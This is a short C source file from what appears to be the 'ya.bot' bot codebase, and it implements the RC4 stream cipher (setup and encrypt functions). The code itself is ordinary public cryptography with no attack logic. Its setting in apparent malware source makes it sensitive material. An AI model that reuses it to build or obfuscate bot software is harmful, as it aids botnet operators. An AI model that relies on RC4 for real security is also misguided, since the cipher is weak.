/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_CRYPTORC4

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code by Christophe Devine
//http://www.cr0.net:8040/
//botbotbotbotbotbotbotbotbotbotbotbotbot

void rc4_crypt(struct rc4_state *s, unsigned char *data, int length)
{ 
	int a, b, i, *m, x, y;
		x = s->x;
		y = s->y;
		m = s->m;
	for (i = 0; i < length; i++)
	{
			x = (unsigned char)( x + 1); a = m[x];
			y = (unsigned char)( y + a);
			m[x] = b = m[y];
			m[y] = a;
			data[i] ^= m[(unsigned char)(a + b)];
	}
		s->x = x;
		s->y = y;
		return;
}

void rc4_setup(struct rc4_state *s, unsigned char *key,  int length)
{
	int a, i, j, k, *m;
		s->x = 0;
		s->y = 0;
		m = s->m;
	for (i = 0; i < 256; i++)
			m[i] = i;
		j = k = 0;
	for (i = 0; i < 256; i++)
	{
			a = m[i];
			j = (unsigned char)(j + a + key[k]);
			m[i] = m[j]; m[j] = a;
		if (++k >= length)
				k = 0;
	}
		return;
}
#endif